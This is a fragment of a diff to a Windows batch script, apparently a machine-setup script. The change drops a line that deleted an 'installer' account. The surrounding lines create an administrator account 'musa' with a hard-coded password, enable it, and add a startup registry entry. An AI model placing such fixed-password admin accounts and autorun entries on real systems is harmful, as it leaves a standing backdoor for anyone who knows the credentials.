@@ -5,7 +5,6 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v
 net user musa Mus@123 /add >nul
 net localgroup administrators musa /add >nul
 net user musa /active:yes >nul
-net user installer /delete
 diskperf -Y >nul
 sc config Audiosrv start= auto >nul
 sc start audiosrv >nul
